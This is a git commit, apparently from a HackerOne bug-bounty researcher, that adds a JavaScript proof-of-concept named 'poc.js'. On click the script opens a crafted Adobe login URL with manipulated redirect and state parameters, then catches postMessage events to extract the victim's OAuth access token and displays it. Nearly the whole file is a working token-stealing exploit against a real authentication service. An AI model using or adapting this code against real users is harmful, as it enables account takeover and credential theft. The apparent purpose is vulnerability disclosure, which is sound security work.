efdec90309d5bd3b7816896550f6ea3dac924457
mrhavit <mrhavit@wearehackerone.com>
2025-04-07 14:23:28 +0300

    aaa

---
+++ adobe4.js
@@ -0,0 +1,36 @@
+// poc.js
+
+let childWindow;
+
+document.body.style.height = "100vh";
+document.body.style.display = "flex";
+document.body.style.justifyContent = "center";
+document.body.style.alignItems = "center";
+
+const heading = document.createElement("h2");
+heading.textContent = "Click anywhere to trigger";
+document.body.appendChild(heading);
+
+document.addEventListener('click', () => {
+    const urlToOpen = "https://auth.services.adobe.com/en_US/index.html?callback=https%3A%2F%2Fims-na1.adobelogin.com%2Fims%2Fadobeid%2Fclio-playground-web%2FAdobeID%2Ftoken%3Fredirect_uri%3Dhttps%253A%252F%252Fauth-light.identity.adobe.com%252Fwrapper-popup-helper%252Findex.html%26state%3D%257B%2522namedsadsadsa1%2522%253A%2522AccessTokenFlow%2522%252C%2522side%2522%253A%2522popup%2522%252C%2522data%2522%253A%257B%2522access_token%2522%253A%2522%2522%257D%257D%26code_challenge_method%3Dplain%26use_ms_for_expiry%3Dfalse&client_id=clio-playground-web&scope=AdobeID%2Cfirefly_api%2Copenid%2Cpps.read%2Cadditional_info.projectedProductContext%2Cadditional_info.ownerOrg%2Cuds_read%2Cuds_write%2Cab.manage%2Cread_organizations%2Cadditional_info.roles%2Caccount_cluster.read&state=%7B%22name%22%3A%22AccessTokenFlow%22%2C%22side%22%3A%22popup%22%2C%22data%22%3A%7B%22access_token%22%3A%22%22%2C%22client_id%22%3A%22ProjectCentralPanel11%22%2C%22returnOrigin%22%3A%22https%3A%2F%2Fcclibrariespanel-cdn.adobe.com%22%2C%22relay%22%3A%22your-relay-value%22%7D%7D&relay=ca48c374-ae25-4d2a-963f-4d6a99d1c538&locale=en_US&flow_type=token&idp_flow_type=login&s_p=google%2Cfacebook%2Capple%2Cmicrosoft%2Cline%2Ckakao&response_type=token&code_challenge_method=plain&redirect_uri=https%3A%2F%2Fauth-light.identity.adobe.com%2Fwrapper-popup-helper%2Findex.html&use_ms_for_expiry=false";
+    
+    childWindow = window.open(urlToOpen, "_blank");
+}, { once: true });
+
+window.addEventListener('message', (event) => {
+    try {
+        const data = typeof event.data === 'string' ? JSON.parse(event.data) : event.data;
+
+        if (data && data.name === 'query-state' && data.data) {
+            const innerData = typeof data.data === 'string' ? JSON.parse(data.data) : data.data;
+
+            if (innerData.name === 'AccessTokenFlow' && innerData.data && innerData.data.access_token) {
+                const accessToken = innerData.data.access_token;
+                alert(`Received access token: ${accessToken}`);
+                document.write(`Received access token: ${accessToken}`);
+            }
+        }
+    } catch (error) {
+        console.error('Invalid message data:', event.data);
+    }
+});
